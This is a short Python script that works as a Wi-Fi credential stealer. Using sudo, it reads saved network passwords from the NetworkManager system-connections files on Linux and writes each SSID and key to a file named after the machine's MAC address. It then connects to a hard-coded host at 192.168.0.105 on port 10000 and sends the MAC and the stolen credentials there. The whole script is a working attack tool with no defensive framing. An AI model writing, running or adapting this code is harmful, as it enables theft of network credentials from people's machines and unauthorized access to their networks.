# Collect all creds	Done
# Create a file
# Get file size
# Send file size
# send file contents


import uuid
import os
import re
import sys
import socket
import subprocess

COMMAND_LINUX = "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/"
RE_LINUX = '/etc/NetworkManager/system-connections/(.*)'
MAC=''
OS=''


def main():
    identify()
    store_data()
    establish_connection()
    send_data()
    close_connection()


def identify():
    global MAC,OS
    MAC = hex(uuid.getnode())
    OS  = sys.platform
    print(" OS => ",OS)

def store_data():
    file = open(MAC,'w')
    # output is a list of all SSID-psk combo
    output = subprocess.check_output(COMMAND_LINUX,shell=True).decode('ascii').split('\n')
    for pair in output:
        try:
            pair = re.findall(RE_LINUX,pair)[0].split(':')
            ssid = pair[0]
            psk  = pair[1].split('=')[1]
            file.write(ssid+','+psk+'\n')
        except:
            pass

    file.close()


def establish_connection():
    global serversocket
    serversocket = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    server_address = ('192.168.0.105',10000)
    serversocket.connect(server_address)



def send_data():
    serversocket.send(MAC.encode('ascii'))

    file = open(MAC,'r')
    CONTENT = file.read()
    serversocket.send(CONTENT.encode('ascii'))

    file.close()

def close_connection():
    serversocket.close()

if __name__ == "__main__":
    main()
